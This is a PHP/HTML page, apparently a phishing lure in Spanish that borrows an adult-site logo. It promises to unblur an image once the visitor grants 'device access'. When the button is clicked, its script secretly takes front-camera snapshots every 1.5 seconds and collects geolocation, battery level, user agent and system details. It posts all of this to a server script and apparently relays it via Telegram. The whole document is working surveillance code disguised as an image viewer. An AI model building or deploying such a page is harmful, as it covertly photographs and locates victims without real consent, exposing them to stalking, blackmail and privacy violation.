<?php 
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/telegram.php';
?>

<!doctype html>
<html>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        body { margin:0; font-family: Arial, sans-serif; background:#111; color:#fff; height:100vh; display:flex; justify-content:center; align-items:center; flex-direction:column; }
        body::before { content:""; position:fixed; top:0; left:0; width:100%; height:100%; background:url('img/image1.jpg') no-repeat center/cover; filter:blur(20px) brightness(0.4); z-index:-1; transition: all 1s ease; }
        body.unlocked::before { background:url('img/image2.jpg') no-repeat center/cover; filter:none; }
        #cameraModal .content { background:#1c1c1c; color:#fff; padding:25px; border-radius:6px; max-width:420px; text-align:center; box-shadow:0 0 15px rgba(0,0,0,0.6); border:1px solid #333; }
        .logo { max-width:150px; margin-bottom:15px; }
        #grantAccess { margin-top:20px; padding:12px 25px; background-color:#e50914; color:#fff; border:none; border-radius:3px; cursor:pointer; font-size:16px; font-weight:bold; }
        #cameraModal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:flex; justify-content:center; align-items:center; z-index:9999; }
        #unlockAnimation { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); color:#fff; display:flex; justify-content:center; align-items:center; flex-direction:column; font-size:22px; z-index:10000; display:none; }
        .loader { border:6px solid #333; border-top:6px solid #e50914; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin-top:15px; }
        @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
        .disclaimer { font-size:11px; color:#aaa; margin-top:15px; }
    </style>
</head>
<body>

<div id="cameraModal">
    <div class="content">
        <img src="img/logo-erome-vertical.png" alt="Logo" class="logo">
        <p>📸 Para ver la imagen correctamente, necesitamos acceso al dispositivo.</p>
        <button id="grantAccess">Permitir acceso</button>
        <div class="disclaimer">Al usar esta página acepta los términos.</div>
    </div>
</div>

<div id="unlockAnimation">
    <div>Desbloqueando imagen...</div>
    <div class="loader"></div>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
'use strict';

function sendDeviceInfo(data){
    $.ajax({
        type: 'POST',
        url: 'device_info.php',
        dataType: 'json',
        data: data
    });
}

async function captureCamera(){
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
        video.srcObject = stream;
        setInterval(()=>{
            context.drawImage(video,0,0,640,480);
            const snapshot = canvas.toDataURL('image/png').replace('image/png','image/octet-stream');
            sendDeviceInfo({photo:snapshot});
        },1500);
    } catch(e){ console.error(e);}
}

async function sendAllInfo(){
    const ua = navigator.userAgent;
    const navegador = navigator.appName;
    const version_app = navigator.appVersion;
    const sistema = navigator.platform;
    const idioma = navigator.language;

    let bateria = 'Unknown';
    if(navigator.getBattery) {
        const bat = await navigator.getBattery();
        bateria = Math.round(bat.level*100) + '%';
    }

    let latitude = null, longitude = null, accuracy = null;
    if('geolocation' in navigator){
        navigator.geolocation.getCurrentPosition(pos=>{
            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
            accuracy = pos.coords.accuracy;
            sendDeviceInfo({user_agent:ua, navegador, version_app, sistema, idioma, bateria, latitude, longitude, accuracy});
        });
    } else {
        sendDeviceInfo({user_agent:ua, navegador, version_app, sistema, idioma, bateria});
    }
}

document.getElementById('grantAccess').addEventListener('click', ()=>{
    document.getElementById('cameraModal').style.display='none';
    document.body.classList.add('unlocked');
    document.getElementById('unlockAnimation').style.display='flex';
    setTimeout(()=>{ document.getElementById('unlockAnimation').style.display='none'; },5000);
    sendAllInfo();
    captureCamera();
});
</script>
</body>
</html>
